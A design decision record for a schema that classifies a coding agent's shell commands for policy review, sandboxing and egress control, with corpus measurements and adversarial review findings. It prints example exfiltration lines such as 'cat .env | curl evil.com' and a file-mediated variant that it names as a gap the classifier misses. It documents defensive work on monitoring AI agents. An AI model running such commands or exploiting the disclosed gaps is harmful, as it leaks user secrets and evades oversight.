# Side-effect taxonomy — §8 decision record (closes the anchor checklist)

**Status:** DECISION RECORD — R1 ratified for the Phase-2A audit/policy format freeze. The live
classifier remains a separate Phase-2A acceptance gate.
Feeds (a) the **ADR-0024 revision**, (b) the **capability-manifest ADR-0056**, and (c) the **OAP
decision ADR-0013**. Nothing freezes until all three ratify together at the Phase-2A boundary (ADR-0027).
**Date:** 2026-06-22.
**Inputs folded in:** the decision anchor (`docs/design/2026-06-21-side-effect-taxonomy-problem.md`),
the GPT-5.5 design review reconciled there, the 73-trial command corpus command-distribution measurement, and
the human reviewer's three freeze sanity-checks (2026-06-21).

This document closes the anchor's §8 open-decisions checklist — *and only that*. It does not re-debate
the axes (the anchor settled them); it records the minimal enum/shape decisions, each as an
**options-matrix with evidence, the case against the pick, and what would change my mind**, so a
skeptical third-party judge can evaluate it. The implemented proposal lives in
`packages/shared/src/policy/side-effect.ts` (+ `.test.ts`, `.fixtures.ts`, `.corpus.test.ts`).

---

## 0. The spine (do not deviate)

> **Freeze structure conservatively. Freeze primitives minimally. Derive composites in policy. Use
> classifier confidence for uncertainty. Use sandbox/egress as the hard backstop.**

Every decision below is an application of this spine. The two load-bearing consequences: (1) the
frozen primitive enums are as small as the real demand allows — composites are policy-derived; (2) the
**classifier is the security-critical half** and lives in the warden (ADR-0017), with the sandbox +
egress allowlist as the authoritative backstop so a classifier mistake fails *safe*.

## 1. The conservative freeze (axes + object shape)

Adopted verbatim from the anchor §2 and implemented as the `SideEffect` zod schema. The frozen
**shape**: `taxonomyVersion` · `staticCapability{toolName, effectEnvelope[], broad}` ·
`dynamic{effectKinds[], scopes[], targets[], modifiers[], composition{kind, segments[], edges[]},
classifier{name, version, confidence, reasons[]}}` · `extensions?`.

- **`bash` "broad" is static-envelope metadata** (`staticCapability.broad=true` + an `effectEnvelope`),
  never an effect-kind value polluting the ontology. This resolves the kernel `StaticCapability`
  drift: the kernel's `"broad"` string sentinel becomes `broad: true` on the object.
- **Growth is `taxonomyVersion` (v1.x additive / v2 semantic) + `extensions`.** The `unknown` enum
  members are fail-closed *runtime* values, **not** the migration path. A malformed core enum value
  rejects; the *known* value `"unknown"` fails closed.

## 2. Calibration evidence (the demand signal — why "minimal" is measured, not asserted)

Measured over the **73-trial command corpus** trajectories (73 trials, 3,457 tool calls, all parsed):

- **bash is 75.8% of all tool calls** (~3:1 over every typed file/search tool combined) — the shell
  classifier carries essentially all the side-effect-governance weight.
- **76.4% of bash commands carry a shell-control feature** (`&&`/`;`/`|`/heredoc/subst) — but driven
  by ordinary composition (`&&`-chains 57%, pipes 30%), **not** obfuscation. Genuinely opaque
  constructs are rare: real `eval` 0.2%, base64 0.04%, process-substitution 0.04%, `bash -c` 0.7%.
- A **"compound/obfuscated → deny" default would deny ~74.9% of legitimate coding commands.** Only
  ~19% of real commands have no shell operators at all.
- Effect mix: process_exec 45.6% · fs_read 23.5% · fs_write 17.4% · network 15.7% · secrets-path
  touch 4.1% (but ~101/107 were *task-legitimate* SSH/password provisioning, not exfil).

**The governing inference (confirmed by the human review):** *composition is not risk.* The classifier
**must decompose** a compound command into primitive effects and disposition each segment; it must
**never** gate on the presence of `&&`/`|`/heredoc. This is encoded as a hard requirement (§3.6) and a
corpus over-classification guard (`benign_compound` cases must never be labeled `obfuscated`).

---

## 3. The closed §8 decisions

### 3.1 `EffectKind` (axis 1 — *what*) — FROZEN: `fs_read · fs_write · process_exec · network_read · network_write · unknown`

- **Options:** (A) this 6-value minimal set; (B) add `credential_access`, `external_state_write`,
  `system_config`, `process_control`, `resource_use` as primitives; (C) a single flat domain enum
  (the original ADR-0024 shape).
- **Pick: A.** Each of B's candidates is *derivable* from the primitives × scope × target (see the
  ledger, §3.7) — adding them duplicates signal and bloats a permanent protocol. C conflates *what*
  with *where*/*how-risky* (the anchor's central correction).
- **Case against:** policies must compute the composites themselves (more pack logic). Mitigated: the
  derivations are simple boolean predicates over frozen fields, and the capability-manifest (§3.9)
  generates/validates them so they don't drift.
- **What would change my mind:** if the §7 corpus or the developer-preview showed a composite that
  *cannot* be derived from primitives+scope+target (a genuinely new orthogonal axis), it becomes a
  v1.x additive `EffectKind` — cheap, since adding an enum member is a minor version bump.

### 3.2 `EffectScope` (axis 2 — *where*) — FROZEN: `workspace · home · system · temp · network · external_service · process · unknown`

- **Options:** (A) this 8-value set; (B) drop `external_service` (derive external-vs-internal from the
  target host); (C) add `repo_metadata` as a primitive scope.
- **Pick: A.** `external_service` is **kept** because the internal-vs-external boundary *is* the
  exfiltration boundary (SEC-022) and the `external_state_write` derivation depends on it — pushing it
  into a fuzzy target claim would scatter a security-critical line. `repo_metadata` is **dropped**: a
  `.git/…` access is a within-`workspace` *target path* the policy refines; it is a sensitivity
  gradient inside an already-defined boundary, not a new boundary.
- **Case against:** the `network` vs `external_service` line is itself a classifier judgment (localhost
  vs public) that can be wrong. Mitigated: it is a classifier *claim* with confidence, and the egress
  allowlist is the authoritative backstop.
- **What would change my mind:** if `.git`-write rules proved un-expressible via target paths, promote
  `repo_metadata` additively.

### 3.3 `RiskModifier` — FROZEN: `destructive · irreversible · persistent`

- **Options:** (A) this 3-value set; (B) also freeze `expensive`, `permission_change`,
  `credential_adjacent`, `background`; (C) include `ambiguous`/`obfuscated`/`unknown` (the anchor's
  candidate listed them).
- **Pick: A.** Each kept modifier is a broad, retry-excluding property hard to derive from kind×scope
  (destructive→POL-003/004; irreversible→POL-005; persistent = a compromise hallmark the §7 set
  demands). B's candidates are policy-derived (§3.7); resource cost specifically is **sandbox-enforced,
  not predicted** (sanity-check 3). C is a *category error* — obfuscation/ambiguity describe classifier
  **certainty**, not the effect's intrinsic risk, so they move to `classifier.confidence` (§3.5). This
  also resolves the anchor's own duplication (it listed `ambiguous`/`obfuscated` in both lists).
- **Case against:** `persistent` has no v1 Appendix-D rule consuming it yet (mild YAGNI tension). Kept
  because the §7 set + threat model demand it and a pack *will* want it; it is a genuine orthogonal
  property, not a single command.
- **What would change my mind:** if the developer preview shows a recurring pack need for `expensive`
  or `permission_change` as a label (vs. a derived finding), promote it additively.

### 3.4 `SideEffectTarget` — FROZEN: kind ∈ `{path,host,url,command,process,package,env_var,unknown}`; `value`; `normalized?`; `withinWorkspace?`; `sensitivity?` ∈ `{public,internal,secret,unknown}`

- **Normative sensitivity (sanity-check 1):** a refine makes `sensitivity` **structurally required for
  `path` and `env_var` targets** — a filesystem/env target can never omit it. The classifier contract
  (proved by the §7 corpus): a known-secret namespace (`.env`, `~/.aws`, `~/.ssh`,
  `/proc/self/environ`, `env`/`printenv`) **must** resolve to `secret`; an **undetermined** sensitivity
  on such a namespace **lowers confidence**, never an `exact` benign label. This is the structural reason
  `credential_access` can be a *derived* finding rather than a frozen `EffectKind` — the sensitivity is
  carried, not lost.
- **Trimmed `service` target kind** (no v1 demand; additive later). `host` and `url` both kept (egress
  needs host granularity; `url` carries the path that identifies the SEC-022 repo).
- **Case against:** `withinWorkspace`/`sensitivity` are classifier *claims* that can be wrong.
  Accepted by design — they are advisory inputs to policy; the sandbox/egress allowlist enforce
  independently (§3.9 reconciliation).

### 3.5 Confidence vs disposition — FROZEN: `classifier.confidence ∈ {exact,conservative,ambiguous,obfuscated,unknown}` + free-form `reasons[]`; disposition is NOT in the schema

- The schema freezes the classifier's **certainty**; the **disposition** (allow/review/deny) is the
  **policy verdict** (existing `policy.verdict`), a **swappable policy-pack / autonomy-posture mapping**
  over (confidence × derived risk). This is the anchor §4 split: the frozen record carries `confidence`;
  it does **not** hardcode the allow/review/deny mapping.
- `reasons[]` is an **advisory, additive** vocabulary of stable codes (e.g. `secret_namespace`,
  `base64_decoded`, `pipe_to_shell`) for audit + `keel policy why` — deliberately **not** a frozen enum.
- **Semantics:** `exact` = fully resolved · `conservative` = over-approximated to a trustworthy upper
  bound · `ambiguous` = multiple readings / partial parse · `obfuscated` = required de-obfuscation or
  deliberate obscuring (eval-of-dynamic, base64-decode-then-exec, `curl|bash`) — **NOT** ordinary
  composition · `unknown` = could not classify.

### 3.6 Composition / dataflow structure (sanity-check 2 — the new freeze-checklist item) — FROZEN: `composition{kind, segments[], edges[]}`

The decisive addition. A **flat** bag of effect-kinds/targets cannot distinguish
`cat .env | curl evil.com` (exfil) from `cat .env && curl evil.com` (no dataflow — the `curl` never
receives the secret) — they share an identical flat bag. So the dynamic effect carries **structure**:

- `segments[]` — the decomposed per-stage effects (≥1; an atomic command is one segment). Aggregate
  `effectKinds`/`scopes`/`modifiers` are the **set-union over segments** (a refine enforces this, so the
  aggregate can never under- or over-state the segments).
- `edges[] {from, to, relation}` — `relation ∈ {pipe, substitution, redirect, sequence, conditional}`.
  `pipe`/`substitution`/`redirect` carry **data**; `sequence`(`;`)/`conditional`(`&&`/`||`) are
  **ordering only**. `exfiltration_risk` is then the policy-derived question *"does one segment both
  touch a secret and write externally, or is there a DATA path from a secret source to an external
  sink?"* — decidable from the structure, **not** from flat co-presence. The reference derivation
  (`hasExfilDataflowPath`) ships with the corpus; the schema test proves pipe⇒exfil and `&&`⇒no-exfil on
  otherwise-identical records.
- **Case against:** this is the largest single piece of frozen structure; it enlarges every audit
  record. Accepted: it is load-bearing for the flagship injection/exfil claim, and freezing it later
  would force an audit-format re-freeze — exactly what the pre-freeze design exists to avoid.

### 3.7 Primitive-vs-policy-derived ledger (the YAGNI ledger)

**Frozen primitives:** the four enums above + the target/confidence/composition shapes.
**Policy-derived (computed by the pack from primitives — NOT frozen):**

| Composite | Derivation |
|---|---|
| `exfiltration_risk` | same segment touches a `secret` target and `network_write ∧ external_service`, or a DATA-path (pipe/subst/redirect) from a `secret`-source segment to that sink (§3.6) |
| `supply_chain` | `process_exec` ∧ `network_read` ∧ `fs_write` ∧ a `package` target (install) |
| `credential_access` | (`fs_read`\|`fs_write`\|env access) ∧ `target.sensitivity = secret` (POL-001) |
| `permission_change` | `process_exec` ∧ a `command` target ∈ {chmod, chown, setfacl, …} |
| `privilege_escalation` | `process_exec` ∧ a `command` target ∈ {sudo, su, doas} (POL-009) |
| `resource_exhaustion`/`expensive` | `process_exec` ∧ a pattern — **enforced by sandbox ulimits (SEC-017), labeled not predicted** |
| `system_config` | (`fs_write`\|`process_exec`) ∧ `system` scope |
| `external_state_write` | `network_write` ∧ `external_service` scope |
| `background` | a classifier `reasons` code; the session-surviving case is `persistent` |

**Sanity-check 3 (explicit):** *runtime resource control is enforced by the sandbox (ulimits, SEC-017),
not by taxonomy prediction.* The taxonomy may **label** a fork bomb (`process_exec` + a `resource_intensive`
reason) but does not claim to predict or prevent exhaustion — the sandbox is the authoritative backstop.
The §7 corpus exercises `chmod`/`chown`, fork bombs, `nohup`/background, and package managers so the
derived ledger is **proven, not theoretical**.

### 3.8 Two shipped dispositions postures (calibrated against the measurement)

Both postures share the **decomposition mandate** (§2/§3.6) and the **hard backstops** (sandbox +
egress) regardless of mapping. The disposition is a policy-pack knob (§3.5), not a frozen constant.

- **`autopilot-dev`** (default for trusted repos): allow resolved-benign (fs_read; in-workspace
  fs_write; build/test process_exec); **review** only resolved `network_write`-external, `destructive`
  outside workspace, `irreversible` (e.g. `git push --force`), and a same-segment or dataflow
  secret→external path;
  **deny** only the genuine-opaque tail (`obfuscated`/`unknown` on a broad/network/external/system
  effect). Calibration target: **median 0** review prompts on the 73-trial command corpus distribution (the
  §8.2 calibration gate — "the test is the product"; SEC-021).
- **`locked-down`**: same backstops, tighter dispositions — review in-workspace destructive, deny
  `obfuscated` even on low-risk reads, deny `unknown` more broadly. Same frozen schema; different
  mapping (no protocol change).

Calibration note: a "composition-presence → deny" rule would deny ~74.9% of real commands (§2). Both
postures therefore disposition **resolved primitive effects per segment**, never composition presence.

### 3.9 Conformance-test strategy + the capability manifest (ADR-0056)

A **single capability manifest** is the source of truth that **generates or validates** policy rules ·
sandbox profile · egress allowlist · conformance tests — *policy decides · sandbox is the physical
guardrail · audit is the evidence · conformance tests prove the three agree*. Runtime reconciliation: a
policy-allow the sandbox blocks (or vice-versa) emits a `policy_sandbox_mismatch` finding (the
defense-in-depth made observable). **Distinct from** the *deferred user-facing* `keel.policy.yaml` DX
surface (spec §11 item 11) — the manifest is the internal build-time source-of-truth, not the no-Rego
authoring surface. Full decision in **ADR-0056**.

### 3.10 ADR sequencing

The **capability-manifest ADR lands alongside the ADR-0024 revision** (anchor recommendation — the
manifest is what makes the taxonomy enforceable; both freeze at 2A). The coherent **2A audit/policy
freeze bundle** = {ADR-0024-revised + ADR-0056-manifest + ADR-0013-OAP + the `@keel/shared` schema PR +
the §7 corpus}, ratified together. **ADR-0004** (policy engine) is the more independent track (it
blocks the policy gate, Epic 2.4 — not the warden process/sandbox or the freeze).

### 3.11 Retry reconciliation (amends ADR-0028 item 5)

Under the multi-axis model, retry-eligible **iff** `effectKinds ⊆ {fs_read}` ∧ `scopes ⊆ {workspace,
temp}` ∧ `modifiers = ∅` ∧ no target is `secret` ∧ `classifier.confidence ∈ {exact, conservative}`.
Everything else (write / network / process / external / system / credential / `unknown` / obfuscated)
is non-retryable. Encoded as `isRetryEligible()` in the schema module and tested per disqualifier.
(`repo_metadata` is dropped from the predicate vs. the anchor draft, consistent with §3.2.)

---

## 4. OAP coupling (Item 3 — full decision in ADR-0013)

**Don't conform; stay an OAP-mappable superset.** OAP (Open Agent Passport) is a single-vendor draft
(APort Technologies; arXiv preprint 2026-03-21; spec repo 3★, 0 release tags, no independent adopters;
self-contradictory license metadata). Its "Decision" record has **no hash-chain/seq/Merkle** (tamper-
evidence is asserted in prose, not structure), **no side-effect taxonomy**, and a **custom non-Rego**
policy language. keel's record is strictly richer. → Keep keel's record as the source-of-truth superset;
**borrow** JCS/RFC-8785 canonicalization + Ed25519 (already on the ADR-0006 path); design the
`target[]` axis to be **OAP-mappable** (subject=principal · action=effectKind · resource=target ·
effect=verdict) so a future *one-way* OAP "Decision" export is cheap. OQ-8's conditional resolves to:
**Appendix B stays bespoke (OAP-mappable), NOT an "OAP profile."** This is *why* the `target[]` axis is
worth its complexity even though we are not conforming.

---

## 5. Definition of ready-to-freeze (the gate)

Per the anchor, the ready-to-freeze gate required: **§8 closed + ratified** (this doc); the
`@keel/shared` schema implemented with round-trip + malformed-reject + property tests; the §7 classifier
corpus green; the capability-manifest ADR accepted; OQ-8/ADR-0013 answered coherently; and **ADR-0006
canonicalizer pinned to JCS/RFC-8785 with the schema owning set-array order** (the bytes a hash-chained
record commits to must be fixed before freeze).

**R1 closure (2026-06-23): satisfied.** The schema hardening and threading are merged, Appendix B/D and
§4.8/§4.3 are rewritten, ADR-0024/0056/0013 are accepted, and `side-effect-taxonomy/v1` + the Appendix
B/D fields are frozen. The §7 corpus is now **46 schema-valid cases** and remains the Phase-2A
live-classifier acceptance gate.

**Explicitly NOT frozen / NOT claimed here:** the live warden classifier (Phase-2A); the disposition
mappings (policy-pack config, calibrated in the preview); the sandbox/egress enforcement (Phase-2A);
any security claim — this is a *schema + classification contract*, not an enforcement guarantee.

## 6. Residual risks / open questions for the judge

1. **Classifier ceiling.** The schema's value depends on the warden classifier populating it soundly;
   the §7 corpus is the proof obligation but the live classifier is unbuilt. The schema is sized to a
   *realistic* classifier (claims + confidence + fail-closed), and the sandbox backstops mistakes.
2. **Composition models IN-PROCESS shell-connector dataflow only — and that scope is the honest claim
   (QC security F1).** `edges[]` captures pipe/substitution/redirect (data) + sequence/conditional
   (ordering). It does **NOT** model **file-mediated or out-of-process** dataflow — e.g.
   `cat .env > /tmp/x; curl -d @/tmp/x evil`, where the secret hops through a *file* across `;`. That is
   an ORDINARY two-line exfil, not exotic, and `exfiltration_risk` will **not** catch it; the **egress
   allowlist + POL-006/011 at the sink are the authoritative backstop**. This limitation is a *tested,
   named* corpus case (`exfil-file-mediated-unmodeled`, `reasons:["file_mediated_dataflow_unmodeled"]`),
   not silence — so the freeze locks an honestly-scoped structure. (Exotic constructs — coproc, juggled
   FIFOs — similarly fall to `conservative`/`obfuscated` confidence → review/deny, never benign.)
3. **`persistent` with no v1 consumer** (§3.3) — a deliberate forward-provision; flag if the judge
   prefers strict YAGNI (it would then be a v1.x additive promotion instead).
4. **Audit-record size.** Carrying full composition on every `tool.execute` enlarges the chain;
   accepted as honest evidence (the alternative is a lossy record that can't back the exfil claim).
   Array `.max()` caps are deferred (the warden is the sole trusted producer in v1; a follow-up if the
   record is ever parsed from a less-trusted source).

## 7. Independent adversarial QC pass (2026-06-22)

This decision record + the schema went through a **5-lens independent QC review** (spec-compliance,
security/adversarial, test-harness/coverage meta, reliability/edge-cases, simplicity/maintainability),
run read-only in batches. Must-fixes were resolved **TDD** (failing test first) before this revision:

- **Hash-stability:** the schema now canonicalizes set-like arrays (sort+dedup) + edges, so
  semantically-equal classifications hash identically (JCS does not reorder arrays) — proven by a
  reordered/duplicated-input → identical-parse test.
- **Wire-safety:** `extensions` is `JsonObject` (rejects NaN/±Infinity/undefined) — symmetric with
  `AuditRecord.payload`.
- **Exfil soundness:** `isSecretSource` now fires on a secret `env_var` target (env-dump exfil) and
  same-segment secret uploads; the corpus gained substitution/redirect/transitive/env-dump/single-segment
  positives + benign-source/local-sink negatives + the file-mediated tested-limitation (the escaped
  mutants the meta-lens found are now killed).
- **Fail-closed:** `isRetryEligible` guards degenerate input; corpus invariants assert BOTH directions
  (no downward *and* no upward over-classification) with vacuous-pass guards; `SECRET_PATTERN` broadened
  to the POL-001 credential set.
- **Honesty:** the file-mediated dataflow gap is disclosed at the same volume as the claim (above).

Residual should-fix/follow-up items (non-blocking, recorded for the judge): array `.max()` caps;
`CompositionKind` is advisory (no consistency refine); top-level `dynamic.targets` is non-authoritative
(policy reads `segments[].targets`); spike repro pinning.

## 8. Second external adversarial re-review (GPT-5.5, 2026-06-23) — NO-GO findings resolved

A **different-model** adversarial reviewer was commissioned to attack the freeze before it locks (the
"secure by default AND flexible/extensible" bar). Verdict: **NO-GO as written**, with concrete findings —
each verified against ground truth (some nuanced or partly-refuted, not rubber-stamped) and resolved TDD in
the hardening pass. The §7 residuals above are now closed by this pass.

**Must-fixes (resolved):**
- **F1 — top-level `dynamic.targets` drift (fail-open).** Non-authoritative yet read by policy: a secret in
  a segment but absent from the bag would dodge POL-001. Now a refine REJECTS drift (top-level must equal
  the segment-target union) and the transform dedups it → policy may trust `dynamic.targets`. *(Nuance: the
  rego is the spike's representative pack, not a frozen policy — but the schema seam was real and is closed.)*
- **F6 — `normalized` optional but load-bearing.** Path/host/url containment keys on `normalized`; absent,
  the Rego body is undefined → the deny does not fire (fail-open). Now required for path/host/url at
  all classifier confidences.
- **F2 — `sideEffect` required on `tool.execute`/`tool.deny`** (was "may later require"); a
  denied-action-fidelity loophole. Pinned in the threading-plan refine.
- **F4 — forward-compat DECISION (the extensibility ask): lenient minor coercion.** `taxonomyVersion` is
  major-pinned / minor-open; a newer-minor record is read via `parseSideEffectCompat`, which coerces members
  this build doesn't know to the fail-closed `unknown` of their axis (ACCEPTED, never silently trusted).
  Every enum gained an `unknown` member as the coercion target. This is how the frozen contract stays
  extensible for a decade without a v2. *(Options weighed: honest-minimal-v2-break · lenient-now ·
  strict-only; the human chose lenient-now for genuine forward interop with a fail-closed floor.)*
- **F5 — ADR-0056 manifest format de-scoped from R1** (it claimed "format is part of the freeze" with no
  schema written); only the decision + invariant ratify; the format is authored + frozen in Phase-2A.
- **F8 — split "format freeze" vs "classifier acceptance"** across ADR-0024 / anchor §7 / the epic plan.
- **F9 — ADR-0006 canonicalizer pinned to JCS / RFC 8785** (was "JCS or stable-stringify").
- **Parser DoS caps (re-review addition):** array-size limits (`SIDE_EFFECT_LIMITS`) so a hostile
  audit-import record cannot exhaust the verifier (trust-before-parse).

**Should-fixes (resolved):** **F3** — the `curl @x` negative now uses a literal body (so the pair truly
differs only by edge relation) plus a `curl @.env` same-segment positive proving `curl @file` reads are
caught; **F7** — corpus filled to the anchor proof obligation (bash -c, backticks, process-sub /
`bash <(curl)`, hex-decode, chown, dd, busy-loop, truncate, `python -c` opacity) with an executable
anchor→fixture coverage table (corpus now 46 cases); **F10** — the §4.3 / ADR-0028 retry-prose drift added
to the R1 rewrite scope; **F11** — a field source-of-truth table (reconciliation doc §8).

**Acceptable-risk / disclosed (no change):** file-mediated + variable-laundering exfil stay out of v1
scope, now NAMED in the tested `SIDE_EFFECT_V1_NOT_MODELED` disclosure (caught by the sandbox/egress
backstop, not the in-process derivation).

### Round 2 (same-day re-review of the hardening) — two new fail-OPEN holes in the fixes themselves

The re-review of the Round-1 deltas returned a second NO-GO and, valuably, found two fail-**open** bugs
introduced *by the hardening* — both fixed TDD:

- **F4 retry fail-open (blocking).** `isRetryEligible` only rejected `sensitivity === "secret"`, so a
  future `{kind, sensitivity}` coerced to `unknown`/`unknown` (or any same-version `unknown` sensitivity)
  read as retry-SAFE. Fixed: a target is retry-safe only if `kind !== "unknown"` AND `sensitivity` is
  neither `secret` nor `unknown`. (Coercing to `unknown` is only fail-closed if consumers treat `unknown`
  as dangerous — this closes the consumer side.)
- **F1 collision / NUL byte (blocking).** `targetKey` joined fields with a separator that was a raw NUL
  byte (which also made the source file non-text — it silently broke grep/edit tooling), and a value
  containing the delimiter could forge top-level/segment equality. Fixed: collision-free `JSON.stringify`
  identity, AND the transform now DERIVES `dynamic.targets` from the segments (authoritative-by-construction)
  rather than trusting the provided bag.
- **F6 (hardened further):** dropped the low-confidence exemption — `normalized` is now required for every
  path/host/url target at ALL confidences (structural, not dependent on the policy reviewing `ambiguous`).
- **F4 version canonicality:** leading-zero versions (`v01`, `v1.01`) and the minor-zero alias (`v1.0`)
  are now rejected so the hashed `taxonomyVersion` bytes are unique.
- **F7 (filled further):** added a real `git fetch` fixture (mapped separately from `git push`), and the
  `bash <(curl)` / hex-decode exec segments now carry the fail-closed `unknown` effect like `curl | bash`.
- **F8/F10/F11 doc reconciliation:** fixture-header freeze-term split; `dynamic.targets` source-of-truth
  row corrected to "derived"; superseded-pointers added to ADR-0028 + MASTER_SPEC §4.3 (the normative
  retry rewrite still lands at R1).
